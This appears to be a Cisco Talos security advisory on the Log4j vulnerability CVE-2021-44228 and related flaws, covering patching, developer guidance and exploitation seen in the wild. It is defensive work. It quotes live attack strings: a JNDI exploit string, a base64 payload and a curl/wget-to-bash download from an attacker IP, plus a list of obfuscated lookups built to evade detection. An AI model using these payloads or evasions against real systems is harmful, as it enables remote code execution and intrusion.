Remote File Inclusion (RFI) attacks occur when a webserver takes a file crafted by an attacker as input and runs or stores it in an unsafe manner. For instance, the webserver could accept an image file that is actually code, then call it to execute after uploading. RFI attacks happen on web applications that dynamically include external files or scripts. A successful RFI can lead to data leaks, remote code execution, or cross site scripting. Avoid dynamic inclusion of user input files, or whitelist files that may be included. Keep the PHP allow\_url\_include option set to off; this will not protect against Local File Inclusion attacks.

## Summary

A critical remote code execution vulnerability in the popular Apache Foundation Log4j library continues to be exploited across the internet, as organizations scramble to patch for this widespread issue. If an attacker exploits this, they could completely take control of an affected server. It can be leveraged in default configurations by an unauthenticated remote attacker to target applications that make use of the Log4j library. This vulnerability, tracked as [CVE-2021-44228](https://logging.apache.org/log4j/2.x/security.html), received a CVSS severity score of a maximum 10.0, and is widely believed to be easy to exploit.

Apache Foundation Log4j is a logging library designed to replace the built-in log4j package. It is often used in popular Java projects, such as Apache Struts 2 and Apache Solr.

Likewise, this library may also be used as a dependency by a variety of web applications found in enterprise environments, including [Elastic](https://github.com/elastic/elasticsearch/issues/81618). Due to the nature of this vulnerability, Cisco Talos believes this will be a widely exploited vulnerability among attackers moving forward, and users should patch affected products and implement mitigation solutions as soon as possible.

Cisco Talos Incident Response (CTIR) is currently supporting retainer customers in regards to attacker activity related to the current log4j vulnerabilities. CTIR recommends organizations update incident response plans, playbooks or a tabletop exercise (TTX) to test the organization's ability to respond to such incidents.

## Vulnerability details

This vulnerability exists in the JNDI component of the LDAP connector, which allows an attacker to retrieve a payload from a remote server and execute it locally. Several proof-of-concepts and vulnerability [walkthroughs](https://www.lunasec.io/docs/blog/log4j-zero-day/) have already been published. This vulnerability can be triggered to retrieve and execute a malicious class file. It resides in the Java Naming and Directory Interface (JNDI) implementation and can be triggered using an LDAP request like the example below.

```
  ${jndi:ldap://attacker_controled_website/payload_to_be_executed}
```

CISA has also released [guidance](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance) for CVE-2021-44228. Additionally, CISA has issued an [emergency directive related to log4j](https://www.cisa.gov/emergency-directive-22-02).

The [Kenna Risk Score](https://www.kennasecurity.com/the-science-behind-kenna/) for CVE-2021-44228 was initially a 93 of out 100, an exceptionally rare score reflecting the severity and potential impact of this vulnerability. This score is being continually re-evaluated and may shift over time. For instance as of 12/17/2021 it had a score of 87. Many factors go into this scoring and changes in the landscape, behaviors from actors, or new discoveries related to the vulnerability can impact its score.

```

A denial of service vulnerability, [CVE-2021-45105](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105) was disclosed on December 16, 2021. When the logging configuration uses a non-default Pattern Layout with a Context Lookup (for example, $${ctx:loginId}), attackers with control over Thread Context Map (MDC) input data can craft malicious input data that contains a recursive lookup, resulting in a StackOverflowError that will terminate the process. **It is recommended that affected users upgrade to log4j 2.17.0 to mitigate this vulnerability.**

[CVE-2021-44832](https://nvd.nist.gov/vuln/detail/CVE-2021-44832) requires an attacker to successfully modify the configuration of systems running log4j 2.17.0 for the vulnerability to be exploitable. Exploitation is then consistent with other identified vulnerabilities and can be detected by previously released coverage. Please refer to the “Coverage” section for additional details.

## Mitigation

### Current guidance

Despite there being some confusion about the increasing number of vulnerabilities related to the original Log4j security flaw, our advice to users and network defenders remains the same. For the largest segment of users, JNDI represents an unnecessary risk, so we suggest disabling this feature so that this threat surface is unavailable. Therefore, we recommend upgrading to Log4j 2.17.0 — the latest version — which disables JNDI by default.

[Log4j 2.17.0](https://logging.apache.org/log4j/2.x/changes-report.html#a2.17.0) is the most recent patch Apache has released. It fixes CVE-2021-44228, [CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name%3DCVE-2021-45046), and [CVE-2021-45105](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105) by:

* Disabling JNDI by default and limiting the default protocols to Java, LDAP, and LDAPS.
* Requiring the log4j2.enableJndi system property to be set to true to allow JNDI.
* Completely removing support for Message Lookups.
* Protecting from infinite recursion in lookup evaluation to prevent denial of service attacks

Talos encourages all customers to investigate their internal and third-party usage of Log4j for vulnerable configurations and take remediation actions. If you are uncertain or unable to determine if your implementation is vulnerable, patch aggressively. Given the risk of third-party appliances that include Log4j, we also recommend that customers and partners conduct routine vulnerability scanning and engage in conversations with vendors, partners and suppliers for additional mitigation support.

For those users that are running Java 7, apache has released log4j 2.12.2. This update features the same mitigation(s) as log4j 2.16.0 and resolves CVE-2021-44228 and CVE-2021-45046. Those users running Java 7 are encouraged to upgrade to this version.

### Earlier patch proves insufficient

Apache released Log4j version 2.15.0, which was found to be insufficient and vulnerable to exploitation in certain configurations. This led to the release of CVE-2021-45046 to account for the incomplete fix.

Based on the discovery that the original patch did not completely safeguard against exploitation, some of the previously recommended mitigation measures have since become insufficient, including the guidance below regarding disabling message lookups:

* Setting system property log4j2.formatMsgNoLookups or environment variable LOG4J\_FORMAT\_MSG\_NO\_LOOKUPS to true for versions 2.10 and greater.
* Modifying the logging configuration to disable message lookups with %m{nolookups}, %msg{nolookups} or %message{nolookups} for releases beginning 2.7 up to and including 2.14.1.

Despite users implementing these changes, there are still code paths in Log4j where message lookups could occur. Known examples are applications that use Logger.printf("%s", userInput), or applications that use a custom message factory, where the resulting messages do not implement StringBuilderFormattable. There may be other attack vectors as well.

### Third vulnerability issued; Talos guidance unchanged

On Dec. 14, an additional vulnerability, [CVE-2021-4104](https://cve.mitre.org/cgi-bin/cvename.cgi?name%3DCVE-2021-4104), was issued to address a flaw in another component of Log4j, JMSAppender. Note this issue only affects Log4j 1.2 when specifically configured to use JMSAppender, which is not the default, potentially making this less worrisome. Log4j 1.2 is currently end of life as of August 2015 and no longer receiving updates. Consistent with our guidance above, we recommended that affected users upgrade to Log4j 2.17.0 to mitigate this vulnerability.

[AppDynamics with Cisco Secure Application,](https://blogs.cisco.com/developer/log4jdevresponse01?ccid%3Dappdynamics-page) which is integrated into AppDynamics Java APM agents, protects environments by:

## Guidance for Developers

Cisco Talos' guidance to developers in the process of assessing their own applications leveraging the Log4j framework is to consider upgrading to version 2.17.0 their primary remediation measure. While case-by-case evaluation and remediation of specific, at-risk code sections may be possible, it is our experience that this puts developers at unnecessary risk of under-assessing the extent to which their applications may be affected — we believe it is simply safer to patch. Some of the considerations necessary for accurately assessing the effects on an application may be more readily apparent only to those with an in-depth security background.

Several factors that may complicate this effort are:

#### Known Vectors

There is no single, universal place that an application will be vulnerable. Anywhere an application is logging user-controlled data via Log4j should be evaluated as a legitimate vector. This could manifest as anything from logging user-controlled URIs, incoming user agents and POST parameters, user-provided files, and so forth. In many cases, there may even be several layers of indirection between the ingest of a user-influenced value and its use by the Log4j framework, further complicating the task of assessing the risk of a particular pathway.

Furthermore, as more information becomes available, additional vectors may be discovered that render previous assumptions surrounding safe and unsafe code invalid, as is demonstrated by the disclosures of CVE-2021-45046 and CVE-2021-4104.

#### Normalization

Due to the range of allowable application-specific encodings, features, and formats that may be available to the attacker in crafting an exploit to trigger this vulnerability, pattern-based approaches to identify and sanitize offending permutations of user-supplied data may be patchwork and incomplete at best. New potential evasions are discovered daily, and application-specific evasions may be difficult to fully inventory and without a specialized security background.

#### Third-Party Dependencies

Developers may judge their applications making direct use of Log4j not to be vulnerable:, however, third-party libraries dependent on the framework are at risk. For example, Apache Tika has a potential vector to trigger this vulnerability by means of a specially crafted HWP file, so applications relying on this toolkit to extract metadata from files may also be vulnerable.

CISA is currently maintaining a public list of affected products [here](https://github.com/cisagov/log4j-affected-db).

#### Identifying vulnerable applications

**CVE-2021-44228**
**CVE-2021-45046**

We recommend developers of any applications making use of Log4j below version 2.17.0 logging user-supplied content take immediate steps to upgrade to version 2.17.0. We also recommend developers assess all third-party dependencies for use of Log4j and upgrade accordingly.

 **CVE-2021-4104**

There is an additional vector for this vulnerability affecting version 1.2 of Log4j via JMSAppender. This vector requires JMSAppender to be enabled and the attacker to provide configurations for TopicBindingName and TopicConnectionFactoryBindingName.

Support for version 1.2 of Apache Log4j reached end- of- life in August 2015. We do not recommend publishing software or devices relying on end-of-life software and urge developers to immediately begin the process of adapting and upgrading to 2.17.0.

**CVE-2021-45105**

There is a [denial-of-service](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105) vulnerability associated with infinite recursion that affects multiple versions of log4j including 2.16.0. Given this, we advise all to update to the newest version 2.17.0 to mitigate that risk.

## Ongoing exploitation activity

### Earliest observed activity

While Talos has observed attacker activity related to CVE-2021-44228 beginning Dec. 2, 2021, there are unverified reports of threat activity dating back to as early as Dec. 1. We strongly recommend that organizations backdate their analysis at least several weeks and expand hunting efforts to scan for exploit activity that may have occurred well before these dates.

Cisco Talos is aware of active exploitation of the vulnerabilities associated with Log4j. This includes activity from miners, other financially motivated attackers, and reports of nation state actors. We've observed widespread activity in our honeypots and telemetry sources. Below is an example of one of the exploitation attempts we observed in the wild.

```
${jndi:ldap://45.155.205[.]233[:]12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC9bdmljdGltIElQXTpbdmljdGltIHBvcnRdfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0L1t2aWN0aW0gSVBdOlt2aWN0aW0gcG9ydF0pfGJhc2gK}
```

The Base64-encoded data in the previous example is responsible for the delivery and execution of additional malicious payloads, an example of which is shown below.

```
(curl -s 45.155.205[.]233[:]5874/[victim IP]:[victim port]||wget -q -O- 45.155.205[.]233[:]5874/[victim IP]:[victim port])|bash
```

It is also important to note that we have observed other protocols used to retrieve malicious payloads in our telemetry. Be aware that attackers may also use LDAP(S), RMI, DNS, NIS, IIOP, CORBA, NDS and HTTP.

In many cases, following successful exploitation, victims are being infected with cryptocurrency mining malware, but we have seen a variety of other payloads including [the Mirai botnet](https://umbrella.cisco.com/blog/blog/2017/01/05/future-assaulting-internet-mirai/) and other various payloads.

This exploit is following a pattern we commonly see in vulnerabilities that emerge unexpectedly. Scattered early incidents from unknown actors have already been observed by looking back in telemetry and demonstrate early adoption by coin miners and botnets. If the pattern holds — and we expect it to — many actors with different objectives, ranging from financial to espionage, will rapidly adopt this exploit in the coming days to secure access for immediate use, resale or long-term footholds.

Cisco Talos has also observed a lead time between attackers' mass-scans and the callbacks from vulnerable systems. This may indicate that the exploit is being triggered as it makes its way through an affected enterprise's infrastructure and is processed by internal systems (log collection systems, SIEMs, etc.) that may be completely separate from the intended target system. Vulnerable inspection, event collection, or logging systems along the communications path may also trigger the exploit, which could result in a callback out to the attacker infrastructure, even in cases where the intended target is not vulnerable. It is also likely that internal vulnerable systems may be targeted with post-compromise activity for lateral movement within the affected enterprise.

Below is an example of Cisco Secure Endpoint detection related to activity associated with the delivery of the [Kinsing](https://malpedia.caad.fkie.fraunhofer.de/details/elf.kinsing) cryptocurrency miner.

![](https://blogger.googleusercontent.com/img/a/AVvXsEjBHMYeZD1h7n1SFP4bQN-Gj095EXUjizOPK_7e33qy3z87mSYbnKleIqcmg03cQkuvw_lV30AZDpvL9xg5YsMatt1UlSHhUfTm0F50H44kJ7TWojgZTRzSNpH0BvJ1xw9t6o47yy4fR62pQK-USUGC9Wra_0fyjTWemg698iHWZQkuWSzbY2E9WCdW8Q=s16000)

Cisco Talos has also confirmed Log4j exploitation activity that resulted in connections to previously known Cobalt Strike servers, a common precursor to ransomware attacks.

### Emerging obfuscations

We have observed a wide variety of obfuscations being used in JNDI lookups to evade pattern-based detection mechanisms that may have been deployed.

JNDI allows the use of a combination of obfuscation techniques ranging from splitting keywords, protocol names and remote locations to using uppercase and lowercase characters. Some examples include:

```
j${k8s:k5:-ND}i${sd:k5:-:}
j${main:\k5:-Nd}i${spring:k5:-:}
j${sys:k5:-nD}${lower:i${web:k5:-:}}
j${::-nD}i${::-:}
j${EnV:K5:-nD}i:
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}attacker_controled_website/payload_to_be_executed}
j${loWer:Nd}i${uPper::}
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker_controled_website/payload_to_be_executed }
${jndi:${lower:l}${lower:d}a${lower:p}://attacker_controled_website/payload_to_be_executed}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker_controled_website/payload_to_be_executed}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker_controled_website/payload_to_be_executed}
${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}attacker_controled_website/payload_to_be_executed}
${jndi:${lower:l}${lower:d}ap://attacker_controled_website/payload_to_be_executed}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker_controled_website/payload_to_be_executed}
${${::-j}ndi:
${${::-j}nd${::-i}:
${en${lower:v}:ENV_NAME:-j}
${lower:${upper:${lower:${upper:${lower:${upper:${lower:${upper:${lower:${upper:${lower:${upper:${lower:j}}}}}}}}}}}}}
${lower:d}${lower:n}${lower:s}://$
${${::-${::-$${::-j}}}}
```

We have also observed attempts to evade detection by using unicode "look-alike" characters similar to the example below where the value of "i" has been replaced by the unicode character U+0131:

${jnd${upper:ı}:ldap:URL}

### Additional threat vectors

Log4j is commonly used in a wide variety of software running on systems in addition to traditional web servers, meaning it is critical not to rule out other vectors of exploitation. This includes devices inspecting various types of communications between an attacker and victim system, which could result in compromise. As mitigations are employed by defenders and as the situation evolves, adversaries will look for new and previously unobserved attack vectors. In this section, we will discuss some of the vectors we have seen abused.

Cisco Talos has observed the use of email-based threats attempting to exploit CVE-2021-44228. Messages may also contain malicious JNDI lookups at different locations such as headers, subject lines and bodies of emails.

![](https://blogger.googleusercontent.com/img/a/AVvXsEgokzQG1YfyF0R-nnZcT7efd613grKSl9juRHWWRd3h6e-mkvsua3D_PD4vsL5cG8pN5iroRSbe9BjU0JnwcinF0u00Ei05z-c5QT30mx5FGU1qR4xgEy8Ol2ayJ4vMIyd7BBISSSHuseRWr9Nl3dbRbj3Xqn-JDiOWlhULLEp93raoMUKMj7VKTnoV8A=s16000)

Although we have seen attempts to place the JNDI attack string in email, at this time we have not identified widespread email campaigns attempting to use email messages to trigger the vulnerability. It is potentially recon as many threat actors and researchers are essentially trying everything in an attempt to find something that eventually hits log4j.

We have also observed a variety of other locations being used to embed JNDI lookups attempting to exploit this vulnerability such as:

* Metadata in file types such as JPEG, OOXML.
* Relationship templates (e.g. "xml.rels") used in OOXML documents.
* Embedded in web pages.

![](https://blogger.googleusercontent.com/img/a/AVvXsEi6vcEc-fV324uEmHD796ZRcbTKfxB5TpP8Ajetjlv9EtIxBBZoSMSvbhlouO2vqC8pszdB7Vycgqrt-OdXmPpIJfPvzOlTdMEMpqpKZU4J7tEAOBKysH5WtffeSQzDDhtosGs5DDpKhHvka4VfFGg4YiLL6Q69P4DF74rwvzE5Fxg_TK2NWBL6fwD_3Q=s16000)

JNDI lookup embedded in a relational template used by Open Office-based documents.

We've also observed attackers embedding JNDI lookups in HTML webpages as well. The websites we analyzed have likely been compromised through commonly vulnerable CMS platforms. In the example below, the JNDI lookup string has been embedded in a hidden form field present on a website and may not be visible when the victim browses the affected page. We've observed multiple methods used to embed the content into various web pages, such as changing the destination URL within an existing hyperlink to one containing the exploit.

![](https://blogger.googleusercontent.com/img/a/AVvXsEgEATl2Vg7XpEwCQofivSKWa28jlgEgMfkDb1gz9nVy8x7tYgKWRuLDQRKlCsuP9U4fjjhhVYeiG73-QNIYyTi4H6nL1lQb-g3VsHVcVIJRMINFSx31bJBVdbVPsLkwscG7QFOqVXH1Dv6-hQsLNEL4AZBm6IvqF5k3P6Gzu2AaLLnpu5mqq33_83tYwg=s16000)

Malicious JNDI lookup embedded in an HTML web page.

Additionally, we have observed attempts to execute a malicious Java class that invokes PowerShell and attempts to perform environment enumeration using an ADSISearcher to query information about the domain environment in which the victim is located. The collected information is then exfiltrated via an outbound HTTP connection to an attacker-controlled server. This activity is consistent with what is commonly performed leading up to the deployment of ransomware.

This demonstrates the varied approaches attackers are now taking in trying to find ways to force malicious input into various vulnerable applications that may exist in target environments. We will likely continue to see new techniques leveraged for this purpose moving forward.

| Common Vulnerability Scoring System (CVSS) Online Calculator, version 3.1 |
| Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X |
| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Attack Vector AV: Local AV: Adjacent AV: Network AV: Physical  Select Attack Vector Parameters  Attack Complexity AC: Low AC: High  Select Attack Complexity Parameters  Privileges Required PR: None PR: Low PR: High  Select Privileges Required Parameters  User Interaction UI: Required UI: None  Select User Interaction Parameters  Scope S: Unchanged S: Changed  Select Scope Parameters  Confidentiality Impact C: Low C: High C: None  Select Confidentiality Impact Parameters  Integrity Impact I: None I: Low I: High  Select Integrity Impact Parameters  Availability Impact A: Low A: High A: None  Select Availability Impact Parameters    Base Score: 10.0 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploit Code Maturity E: Functional  E: High  E: Not Defined  E: Proof-of-Concept  E: Unproven   Select Exploit Code Maturity Parameters  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   Select Remediation Level Parameters  Report Confidence RC: Unknown  RC: Reasonable  RC: Not Defined  RC: Confirmed   Select Report Confidence Parameters     Temporal Score: 10.0 |
| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Confidentiality Requirement CR: Low  CR: Medium  CR: High  CR: Not Defined   Select Confidentiality Requirement Parameters  Integrity Requirement IR: Not Defined  IR: Low  IR: Medium  IR: High   Select Integrity Requirement Parameters  Availability Requirement AR: Low  AR: Medium  AR: High  AR: Not Defined   Select Availability Requirement Parameters  Modified Attack Vector MAV: Local  MAV: Adjacent  MAV: Network  MAV: Physical  MAV: Not Defined   Select Modified Attack Vector Parameters  Modified Attack Complexity MAC: Low  MAC: High  MAC: Not Defined   Select Modified Attack Complexity Parameters  Modified Privileges Required MPR: None  MPR: Low  MPR: High  MPR: Not Defined   Select Modified Privileges Required Parameters  Modified User Interaction MUI: Required  MUI: None  MUI: Not Defined   Select Modified User Interaction Parameters  Modified Scope MS: Unchanged  MS: Changed  MS: Not Defined   Select Modified Scope Parameters  Modified Confidentiality MC: None  MC: Low  MC: High  MC: Not Defined   Select Modified Confidentiality Parameters  Modified Integrity MI: None  MI: Low  MI: High  MI: Not Defined   Select Modified Integrity Parameters  Modified Availability MA: None  MA: Low  MA: High  MA: Not Defined   Select Modified Availability Parameters    Environmental Score: 10.0 |
